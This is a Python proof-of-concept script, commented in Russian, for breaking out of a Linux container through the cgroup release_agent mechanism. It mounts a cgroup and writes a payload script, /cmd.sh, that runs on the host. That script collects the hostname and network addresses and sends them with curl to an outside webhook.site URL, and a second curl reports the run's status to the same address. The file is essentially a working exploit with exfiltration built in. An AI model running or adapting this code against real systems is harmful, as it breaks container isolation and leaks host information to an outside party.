import os
import subprocess

WEBHOOK_URL = "https://webhook.site/e497c7bf-1edd-41d4-ba35-a5f6311a07a8"

def run_poc():
    print("[*] Starting Escape PoC...")
    
    try:
        # 1. Создаем временную директорию для монтирования cgroup
        if not os.path.exists("/tmp/cgroup"):
            os.makedirs("/tmp/cgroup")
        
        # Попытка примонтировать cgroup контроллер
        # Если это сработает — мы на полпути к выходу
        os.system("mount -t cgroup -o rdma cgroup /tmp/cgroup")
        os.makedirs("/tmp/cgroup/x")
        
        # 2. Включаем уведомления о завершении процесса
        os.system("echo 1 > /tmp/cgroup/x/notify_on_release")
        
        # 3. Находим путь к нашему контейнеру на хосте через /etc/mtab или /proc/self/mountinfo
        host_path = subprocess.check_output("sed -n 's/.*\perdir=\([^,]*\).*/\\1/p' /proc/mounts", shell=True).decode().strip()
        
        # 4. Создаем скрипт-полезную нагрузку, который выполнится НА ХОСТЕ
        # Этот скрипт просто отправит инфу о хосте на твой вебхук
        payload_path = "/cmd.sh"
        with open(payload_path, "w") as f:
            f.write(f"#!/bin/bash\n")
            f.write(f"hostname > /tmp/out\n")
            f.write(f"ip addr >> /tmp/out\n")
            f.write(f"curl -X POST -d @/tmp/out {WEBHOOK_URL}\n")
        
        os.chmod(payload_path, 0o755)
        
        # 5. Прописываем путь к нашему скрипту в release_agent
        # Внимание: путь должен быть указан с точки зрения ФС хоста
        os.system(f"echo {host_path}{payload_path} > /tmp/cgroup/release_agent")
        
        # 6. Триггерим выполнение: запускаем короткоживущий процесс в этой cgroup
        os.system("sh -c 'echo 0 > /tmp/cgroup/x/cgroup.procs'")
        
        return "PoC Triggered. Check Webhook."
    except Exception as e:
        return f"PoC Failed: {str(e)}"

if __name__ == "__main__":
    result = run_poc()
    # Отправляем статус попытки на вебхук
    os.system(f"curl -s -X POST -d 'POC_STATUS: {result}' {WEBHOOK_URL}")
